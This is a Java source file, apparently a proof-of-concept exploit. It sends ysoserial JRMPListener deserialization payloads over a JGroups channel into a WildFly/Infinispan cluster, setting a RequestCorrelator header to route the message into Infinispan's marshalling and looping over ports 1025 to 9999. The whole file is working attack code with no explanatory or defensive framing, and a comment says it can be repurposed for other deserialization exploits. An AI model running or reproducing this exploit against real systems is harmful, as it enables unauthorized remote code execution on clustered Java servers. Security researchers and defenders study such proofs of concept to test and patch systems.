package example;

import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;

import org.jgroups.JChannel;
import org.jgroups.Message;
import org.jgroups.blocks.RequestCorrelator;
import org.jgroups.blocks.RequestCorrelator.Header;
import org.jgroups.conf.ClassConfigurator;

import ysoserial.payloads.JRMPClient;
import ysoserial.payloads.JRMPListener;

import org.jboss.marshalling.Marshaller;
import org.jboss.marshalling.Marshalling;
import org.jboss.marshalling.MarshallerFactory;
import org.jboss.marshalling.MarshallingConfiguration;
import org.jboss.marshalling.ModularClassResolver;
import org.jboss.modules.ModuleLoader;
import java.io.ByteArrayOutputStream;
import org.wildfly.clustering.marshalling.jboss.IndexExternalizer;
import java.io.DataOutputStream;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class Exploit
{
    private JChannel channel;
    private MarshallerFactory factory;
    private MarshallingConfiguration config;

    public Exploit(){
        factory = Marshalling.getProvidedMarshallerFactory ( "river" );
        config = new MarshallingConfiguration ();
        config.setClassResolver ( ModularClassResolver.getInstance(ModuleLoader.forClass(Exploit.class)) );
    }
    
    public JChannel getChannel(){
        return channel;
    }
    
    public void setChannel(JChannel channel){
        this.channel = channel;
    }
    
	public static void main ( String [] args ) throws Exception
	{
	    Exploit exploit = new Exploit();
	    System.out.println("created exploit");
	    int i = 1025;
	    while(i < 10000){
	        Serializable uro = exploit.createListener(Integer.toString(i++));
	        System.out.println("created listener with port " + i);
	        exploit.sendObject(uro);
	        System.out.println("send object");
	    }
	}

    private void sendObject(Serializable maliciousObject) throws Exception {
        setChannel(new JChannel("jgroups.xml"));
        getChannel().connect("ee");
        sendPayload(maliciousObject);
        getChannel().close();
    }
	
	public Serializable createListener(String command) throws Exception{
        return new JRMPListener().getObject(command);
	}
	
	public void sendPayload(Serializable payload) throws Exception{
	        Message msg = new Message(null);

	        // needed to to route the message into Infinispan
	        short id=ClassConfigurator.getProtocolId(RequestCorrelator.class);
	        msg.putHeader ( id, new Header(Header.REQ, 0L, id) );

	        msg.setBuffer ( serialize(payload) );
	        channel.send ( msg );
	}

	// standard use of JBoss Marshalling + ModularClassLoader https://developer.jboss.org/wiki/ModularSerialization,
	// with the exception of an extra short specific to Infinispan's marshalling.
	// The rest can be repurposed for any deserialization exploits
	// using the ModularClassResolver
	public byte [] serialize ( Object obj ) throws Exception
	{
		Marshaller marshaller = factory.createMarshaller ( config );
		ByteArrayOutputStream out = new ByteArrayOutputStream ();
		marshaller.start ( Marshalling.createByteOutput ( out ) );
		DataOutputStream dos = new DataOutputStream(out);

	        IndexExternalizer.VARIABLE.writeData(dos, 2);

		marshaller.writeObject ( obj );
		marshaller.finish ();
		return out.toByteArray ();
	}
}
